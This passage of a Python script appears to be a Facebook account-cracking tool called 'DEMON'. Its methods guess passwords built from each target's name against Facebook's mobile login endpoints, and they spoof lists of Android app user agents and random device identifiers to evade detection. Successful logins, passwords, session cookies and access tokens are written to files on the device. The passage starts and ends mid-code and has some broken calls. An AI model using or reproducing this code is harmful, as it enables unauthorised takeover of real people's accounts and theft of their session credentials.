FBDV/LG-H850;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797113;FBDM/{density=2.625,width=1080,height=2137};FBLC/en_GB;FBRV/276333355;FBCR/"+fbcr+";FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/motorola one zoom;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797441;FBDM/{density=3.0,width=1080,height=2265};FBLC/en_GB;FBRV/276389460;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VOG-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922314;FBDM/{density=2.625,width=1080,height=2134};FBLC/de_DE;FBRV/275142282;FBCR/"+fbcr+";FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONEPLUS A6013;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987656;FBDM/{density=1.75,width=720,height=1448};FBLC/en_GB;FBRV/276404237;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A217M;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]","Dalvik/2.1.0 (Linux; U; Android 9; FIG-LX1 Build/HUAWEIFIG-L31) [FBAN/Orca-Android;FBAV/302.0.0.11.117;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/275958904;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBDV/FIG-LX1;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2032};FB_FW/1;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273921911;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBRV/274807707;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987658;FBDM/{density=2.75,width=1080,height=2168};FBLC/en_GB;FBRV/277267055;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987658;FBDM/{density=3.0,width=1080,height=2020};FBLC/en_GB;FBRV/277454707;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987623;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBRV/277531280;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 4X;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987624;FBDM/{density=3.0,width=1080,height=1776};FBLC/sv_SE;FBRV/277662387;FBCR/"+fbcr+";FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto G (5S) Plus;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","Dalvik/2.1.0 (Linux; U; Android 9; Kirin Treble Build/PQ2A.190405.003) [FBAN/FB4A;FBAV/306.1.0.40.119;FBPN/com.facebook.katana;FBLC/ru_US;FBBV/273922298;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/Huawei;FBDV/Kirin Treble;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.4,width=1080,height=2075};FB_FW/1;FBRV/275142282;]","[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_GB;FBRV/277806148;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797148;FBDM/{density=3.0,width=1080,height=2043};FBLC/en_GB;FBRV/276389460;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Mi A2 Lite;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444778;FBDM/{density=2.0,width=720,height=1369};FBLC/en_GB;FBRV/278696245;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803856;FBDM/{density=2.0,width=720,height=1440};FBLC/en_GB;FBRV/271519795;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/DUB-LX1;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444755;FBDM/{density=1.2125,width=720,height=1417};FBLC/en_GB;FBRV/278492457;FBCR/"+fbcr+";FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-X430;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444772;FBDM/{density=1.875,width=720,height=1458};FBLC/en_GB;FBRV/278680025;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A426B;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444755;FBDM/{density=1.30625,width=720,height=1280};FBLC/en_GB;FBRV/0;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5A;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/287.0.0.50.119;FBBV/243660812;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBRV/245218954;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5A;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=3.0,width=1080,height=2265};FBLC/en_GB;FBRV/279985922;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ELE-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",])
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				headers={'Host': 'b-graph.facebook.com',
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-Fb-Connection-Quality': 'EXCELLENT',
'X-Fb-Sim-Hni': '41001',
'X-Fb-Net-Hni': '41001',
'User-Agent':DEMON_ua,
'X-Fb-Connection-Bandwidth': '24714729',
'Content-Type': 'application/x-www-form-urlencoded',
'X-Fb-Connection-Type': 'WIFI',
'X-Fb-Device-Group': '4503',
'X-Tigon-Is-Retry': 'False',
'X-Fb-Friendly-Name': 'authenticate',
'X-Fb-Request-Analytics-Tags': 'unknown',
'Priority': 'u=3, i',
'Accept-Encoding': 'gzip, deflate',
'X-Fb-Http-Engine': 'Liger',
'X-Fb-Client-Ip': 'True',
'X-Fb-Server-Cluster': 'True',
}

				data = {'adid' : str(uuid.uuid4()),
'format' : 'json',
'device_id' : str(uuid.uuid4()),
'email' : uid,
'password' : pw,
'generate_analytics_claim' : '1',
'community_id' : '',
'linked_guest_account_userid' :'',
'cpl' : 'true',
'try_num' : '1',
'family_device_id' : str(uuid.uuid4()),
'secure_family_device_id' : str(uuid.uuid4()),
'sim_serials' : ["00920088911210748054"],
'credentials_type' : 'password',
'fb4a_shared_phone_cpl_experiment' : 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
'fb4a_shared_phone_cpl_group' : 'enable_v3_at_risk',
'enroll_misauth' : 'false',
'generate_session_cookies' : '1',
'error_detail_type' : 'button_with_disabled',
'source' : 'login',
'generate_machine_id' : '1',
'jazoest' : '22377',
'meta_inf_fbmeta' : 'V2_UNTAGGED',
'advertiser_id' : str(uuid.uuid4()),
'encrypted_msisdn': '',
'currently_logged_in_userid' : '0',
'locale' : 'en_GB',
'client_country_code' : 'GB',
'fb_api_req_friendly_name' : 'authenticate',
'fb_api_caller_class' : 'Fb4aAuthHandler',
'api_key' : '882a8490361da98702bf97a021ddc14d',
'sig' : 'e5abae6d6564813bfadc6dcd42256834',
'access_token' : '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
				q = requests.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers,verify=True).json()
				#rint(q)
				if "session_key" in q:
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					token = q["access_token"]
					open('/sdcard/COOKIE TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[DEMON OK] %s | %s \033[1;97m '%(uid,pw))
					#(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
					ok.append(uid)
					#p("\033[1;33m[💥]COOOKIIE :\033[1;33m "+cok)
					open('/sdcard/DEMON_M2_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/DEMON_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[DEMON-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/DEMON_M2_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method2(uid,nm,pwx)
		except Exception as e:
			self.method2(uid,nm,pwx)
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [DEMON] %s | M3 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
			facebook_version = f'{random.randint(10,440)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
			fbbv = str(random.randint(10000000, 99999999))
			fbrv = str(random.randint(10000000, 99999999))
			fbsv = f"{random.uniform(4.0, 10.0):.1f}"
			density = random.choice(["2.0","2.25","2.625","2.75","3.0","3.25","3 75"])
			width = random.randint(720, 1440)
			height = random.randint(1080, 2560)
			fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
			fbcr = random.choice(["MTN-Stay Safe","MTN-STAY SAFE","MTN NG","null","Airtel NG","","Glo NG","BeSafe Airtel","9mobile"])
			fban = random.choice(["FB4A", "FB5A", "FB6A"])
			fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
			##DEMON_ua = f"[FBAN/{fban};FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Oppo;FBBD/Oppo;FBDV/PESM10;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
			##DEMON_ua = f"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=3.0,width=1080,height=2265};FBLC/cs_CZ;FBRV/279985922;FBCR/O2.CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ELE-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
			DEMON_ua = f"[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797441;FBDM/"+"{"+f"density=2.625,width=1080,height=2131"+"}"+f";FBLC/en_US;FBRV/276081113;FBCR/{fbcr};FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
			DEMON_ua = f"[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/{str(random.randint(100000000,999999999))};FBDM/"+"{"+f"density={density},width={width},height={height}"+"}"+f";FBLC/en_US;FBRV/{str(random.randint(100000000,999999999))};FBCR/{fbcr};FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {
				"email": uid, # --> Email Facebook
				"password": pw, # --> Password Facebook
				"adid": str(uuid.uuid4()),
				"device_id": str(uuid.uuid4()),
				"family_device_id": str(uuid.uuid4()),
				"session_id": str(uuid.uuid4()),
				"advertiser_id": str(uuid.uuid4()),
				"reg_instance": str(uuid.uuid4()),
				"machine_id": "".join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(24)),
				"locale": "en_US", # --> From Parsing User Agent
				"country_code": "US", # --> From Parsing User Agent
				"client_country_code": "US", # --> From Parsing User Agent
				"cpl": "true",
				"source": "login",
				"format": "json",
				"credentials_type": "password",
				"error_detail_type": "button_with_disabled",
				"generate_session_cookies": "1",
				"generate_analytics_claim": "1",
				"generate_machine_id": "1",
				"tier": "regular",
				"device": "SM-A505FN", # --> From Parsing User Agent
				"os_ver": "10", # --> From Parsing User Agent
				"app_id": "350685531728", # --> From App ID
				"app_ver": "307.0.0.40.111", # --> From Parsing User Agent
				"meta_inf_fbmeta": "NO_FILE", # --> Optional Value
				"currently_logged_in_userid" : "0",
				"fb_api_req_friendly_name": "authenticate",
				"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
				"fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
				"fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
				"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
				"api_key": "882a8490361da98702bf97a021ddc14d",
				"sig":"62f8ce9f74b12f84c123cc23437a4a32",
				#[ Many Other Data With Different Functions ]---------- ###
				#"method": "auth.login", # --> Under Certain Conditions (read the request description above)
				#"relative_url": "method/auth.login",
				#"omit_response_on_success": "false",
				"logged_out_id": str(uuid.uuid()),
				#"interface": "wifi",
				#"reason", "unknown",
				#"headwind_version", "3",
				#"headwind_cursor", "{}",
				"hash_id": str(uuid.uuid()),
				"community_id": "",
				"try_num": "1",
				#"cds_experiment_group": "-1",
				#"enroll_misauth": "false",
				#"jazoest", "", ##2133
				#"encrypted_msisdn": "",
				"sim_country": "id",
				"network_country": "id",
				#"should_query_for_animation": "true",
				#"flow": "CONTROLLER_INITIALIZATION",
				"query_hash": "".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(40)),
				}
				content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
				headers = {
				"User-Agent": DEMON_ua,
				"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
				"X-FB-SIM-HNI": str(random.randint(20000, 40000)),
				"X-FB-Net-HNI": str(random.randint(20000, 40000)),
				"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
				"X-FB-Connection-Quality": "GOOD",
				"X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
				"X-Fb-Net-Sid": "",
				"X-FB-HTTP-Engine": "Liger",
				"X-Tigon-Is-Retry": "False",
				"X-FB-Friendly-Name": "authenticate",
				"Content-Type": "application/x-www-form-urlencoded",
				"Content-Length": str(len(content_lenght)),
				#[ Many Other Headers With Different Functions ]---------- ##
				#"server_timestamps": "true",
				#"fb_api_caller_class": "graphservice",
				#"fb_api_analytics_tags": "["GraphServices"]",
				#"request_token": Token,
				"Priority": "u=3, i",
				"device_id": str(uuid.uuid4()),
				"family_device_id": str(uuid.uuid4()),
				"X-FB-Client-IP": "True",
				"X-FB-Server-Cluster": "True",
				"X-MSGR-Region": "FRC"
				}
				q = ses.post("https://b-graph.facebook.com/auth/login",params=data,headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[DEMON-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/DEMON_M3_OK.txt','a').write(uid+'|'+pw+'\n')
					#os.system('espeak -a 300 " DEMON,  Ok,  id"')
					open('/sdcard/DEMON_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;35m[DEMON-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/DEMON_M3_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method3(uid,nm,pwx)
		except Exception as e:
			self.method3(uid,nm,pwx)
	def method4(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [DEMON] %s | M4 🔥 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			ss = random.choice(["en_US","fr_FR","ha_NG","en_GB"])
			sam = random.choice(samsung)
			net = random.choice(["MTN-Stay Safe","MTN-STAY SAFE","MTN NG","null","Airtel NG","","Glo NG"])
			fbbv = str(random.randint(211111111,499999999))
			fbav = f'{random.randint(200,450)}.0.0.{random.randint(11,99)}.{random.randint(111,399)}'
			#m4url = "https://iquaqib.vercel.app/ua"
			#m4ua = requests.get(m4url).text
			#m4ua = iAmMethod1Ua()
			m9ua = "[FBAN/FB4A;FBAV/54.0.0.3795;FBBV/66205985[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/"+ss+";FBCA/arm64-v8a:;FBCR/;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X695;FBSV/11;FBDM/{density=2.0,width=720,height=1440};]"
			m9ua = "[FBAN/FB4A;FBAV/444.0.0.2662;FBBV/5231713;[FBAN/FB4A;FBAV/"+fbav+";FBBV/"+fbbv+";FBDM/{density=2.625,width=1080,height=1920};FBLC/en_GB;FBRV/0;FBCR/"+net+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-"+sam+";FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
			ua = random.choice(m9ua)
			ua = random.choice(ugent)
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				adid=str(uuid.uuid4())
				device_id=str(uuid.uuid4())
				data = {'adid': adid, 'format': 'json', 'device_id': device_id, 'email': uid, 'password': pw, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
				headers = {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'WIFI','Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
				q = ses.post("https://api.facebook.com/method/auth.login",data=data, headers=headers, allow_redirects=False).json()
				#rint(q)
				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					p('\r\033[1;92m[DEMON-OK] %s | %s \033[1;97m '%(uid,pw))
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/DEMON_M4_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/DEMON_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;91m[DEMON-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/DEMON_M4_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method4(uid,nm,pwx)
		except Exception as e:
			self.method4(uid,nm,pw)
	def method5(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [DEMON] %s | M5 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			android_version = random.choice([str(random.randint(4,7))+'.'+str(random.randint(0,9))+'.'+str(random.randint(0,9)),'7','6','8.0.0','8.1.0','8','9','10','11','12','13'])
			zero = random.choice(samsung)
			facebook_version = f'{random.randint(10,440)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
			facebook_version2 = f'{random.randint(10,999)}.0.0.{random.randint(0,999)}'
			dbav = str(random.randint(1000000, 9999999))
			fbbv = str(random.randint(10000000, 99999999))
			fbrv = str(random.randint(10000000, 99999999))
			fbsv = f"{random.uniform(4.0, 10.0):.1f}"
			density = random.choice(["2.0","2.25","2.625","2.75","3.0","3.25","3 75"])
			width = random.randint(720, 1440)
			height = random.randint(1080, 2560)
			fblc = random.choice(["en_NG","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ha_NG","ru_RU","zh_CN","ar_AE","en_GB"])
			lan = random.choice(["en_US","fr_FR","ha_NG","en_GB"])
			lan2=lan.split("_")[1]
			fbcr = random.choice(["MTN-Stay Safe","MTN-STAY SAFE","MTN NG","null","Airtel NG","","Glo NG","BeSafe Airtel","9mobile"])
			andro = str(random.choice(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','6.0.1','5.0','4.0','4.3.4','7.0.1','8.0.1','8.1.0','3','4','5','6','7','8','9','10','11','12','13']))
			fban = random.choice(["FB4A", "FB5A", "FB6A"])		
			archi = random.choice(['armeabi-v7a:armeabi','arm64-v8a:','arm64-v8a:null','x86:armeabi-v7a','arm64-v8a:armeabi-v7a:armeabi'])
			DEMON_ua = f"[FBAN/FB4A;FBAV/{facebook_version2};FBBV/{dbav};[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM/"+"{"+f"density={density},width={width},height={height}"+"}"+f";FBLC/{lan};FBRV/{fbbv};FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-{zero};FBSV/{random.randint(10,13)};FBOP/19;FBCA/arm64-v8a:;]"
			DEMON_ua = f"[FBAN/FB4A;FBAV/{facebook_version2};FBBV/{dbav};[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM/"+"{"+f"density={density},width={width},height={height}"+"}"+f";FBLC/{lan};FBRV/{fbrv};FBCR/{fbcr};FBMF/meizu;FBBD/meizu;FBPN/com.facebook.katana;FBDV/meizu note9/DS;FBSV/9.0.0;FBOP/1;FBCA/arm64-v8a:;]"
			DEMON_ua = f"[FBAN/FB4A;FBAV/{facebook_version2};FBBV/{dbav};[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM/"+"{"+f"density={density},width={width},height={height}"+"}"+f";FBLC/{lan};FBRV/{fbrv};FBCR/{fbcr};FBMF/Coolpad;FBBD/Coolpad;FBPN/com.facebook.katana;FBDV/C1-U02;FBSV/"+f"{andro};FBOP/1;FBCA/{archi};]"
			DEMON_ua = f"[FBAN/{fban};FBAV/{facebook_version};FBLC/{lan};FBBV/{fbbv};FBCR/{fbcr};FBMF/Samsung;FBBD/Samsung;FBDV/SM-{zero};FBSV/{android_version};FBCA/{archi};FBDM/"+"{"+f"density={density},width={width},height={height}"+"}"+"]"
			DEMON_ua = random.choice(["[FBAN/FB4A;FBAV/59.0.0.13.313;FBBV/19955368;FBDM/{density=3.0,width=1080,height=1920};FBLC/"+lan+";FBCR/ ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S975L;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/407.0.0.30.97;FBBV/458543257;FBDM/{density=1.75,width=720,height=1515};FBLC/"+lan+";FBRV/460531678;FBCR/"+fbcr+";FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto e(7) plus;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/412.0.0.22.115;FBBV/468774617;FBDM/{density=3.0,width=1080,height=2076};FBLC/"+lan+";FBRV/470537983;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/411.1.0.29.112;FBBV/466874235;FBDM/{density=2.625,width=1080,height=2183};FBLC/"+lan+";FBRV/468551777;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A715F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]","FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/381462200;FBDM/{density=2.0,width=720,height=1456};FBLC/"+lan+";FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a","[FBAN/FB4A;FBAV/409.0.0.27.106;FBBV/462563389;FBDM/{density=2.8125,width=1080,height=2190};FBLC/"+lan+";FBRV/464602213;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G998B;FBSV/13;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]","Dalvik/2.1.0 (Linux; U; Android 11; moto g go Build/RRHG31.Q3-37-43-43-5-4) [FBAN/FB4A;FBAV/386.0.0.35.108;FBPN/com.facebook.katana;FBLC/"+lan+";FBBV/402949595;FBCR/"+fbcr+";FBMF/motorola;FBBD/motorola;FBDV/moto g go;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1504};FB_FW/1;FBRV/0;]","[FBAN/FB4A;FBAV/396.0.0.21.104;FBBV/428168139;FBDM/{density=1.3312501,width=800,height=1216};FBLC/"+lan+";FBRV/429820205;FBCR/;FBMF/Qlink;FBBD/Qlink;FBPN/com.facebook.katana;FBDV/Scepter8;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;]","Dalvik/2.1.0 (Linux; U; Android 6.0.1; D6503 Build/23.5.A.1.291) [FBAN/Orca-Android;FBAV/139.0.0.17.85;FBPN/com.facebook.orca;FBLC/in_ID;FBBV/74871072;FBCR/"+fbcr+";FBMF/Sony;FBBD/Sony;FBDV/D6503;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1776};FB_FW/1;]","Mozilla/5.0 (Linux; Android 11; ONEPLUS A6003 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/PAAA;FBAV/398.0.0.27.97;FBDM/{density=3.0,width=1080,height=2057};FBLC/"+lan+";FBBV/458437540;FB_FW/2;FBSN/Android;FBDI/86d59981-2b37-4fbe-aa09-4a8bd479c6fe;FBCR/"+fbcr+";FBMF/OnePlus;FBBD/OnePlus;FBDV/ONEPLUS A6003;FBSV/11;FBCA/arm64-v8a:null;]","Dalvik/2.1.0 (Linux; U; Android 10; moto e(7i) power Build/QOJS30.506-7-18) [FBAN/FB4A;FBAV/407.0.0.30.97;FBPN/com.facebook.katana;FBLC/es_US;FBBV/458543253;FBCR/"+fbcr+";FBMF/motorola;FBBD/motorola;FBDV/moto e(7i) 